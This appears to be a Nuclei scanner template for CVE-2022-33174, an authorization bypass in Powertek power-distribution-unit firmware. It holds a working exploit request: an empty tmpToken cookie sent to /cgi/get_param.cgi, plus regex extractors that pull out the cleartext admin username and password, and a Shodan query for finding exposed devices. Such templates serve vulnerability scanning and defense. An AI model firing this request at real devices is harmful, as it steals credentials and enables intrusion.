id: CVE-2022-33174
info:
  author: pikpikcu
  classification:
    cve-id: CVE-2022-33174
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-863
  description: 'Power Distribution Units running on Powertek firmware (multiple brands)
    before 3.30.30 allows remote authorization bypass in the web interface. To exploit
    the vulnerability, an attacker must send an HTTP packet to the data retrieval
    interface (/cgi/get_param.cgi) with the tmpToken cookie set to an empty string
    followed by a semicolon. This bypasses an active session authorization check.
    This can be then used to fetch the values of protected sys.passwd and sys.su.name
    fields that contain the username and password in cleartext.

    '
  metadata:
    shodan-query: http.html:"Powertek"
    verified: 'true'
  name: Powertek Firmware - Authorization Bypass
  reference:
  - https://gynvael.coldwind.pl/?lang=en&id=748
  - https://nvd.nist.gov/vuln/detail/CVE-2022-33174
  severity: high
  tags: cve,cve2022,powertek,auth-bypass
requests:
- extractors:
  - group: 1
    part: body
    regex:
    - <sys\.passwd>([A-Z0-9a-z]+)<\/sys\.passwd>
    - <sys\.su\.name>([a-z]+)<\/sys\.su\.name>
    type: regex
  matchers:
  - type: word
    words:
    - <sys.passwd>
    - <sys.su.name>
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /cgi/get_param.cgi?xml&sys.passwd&sys.su.name HTTP/1.1

    Host: {{Hostname}}

    Cookie: tmpToken=;

    '
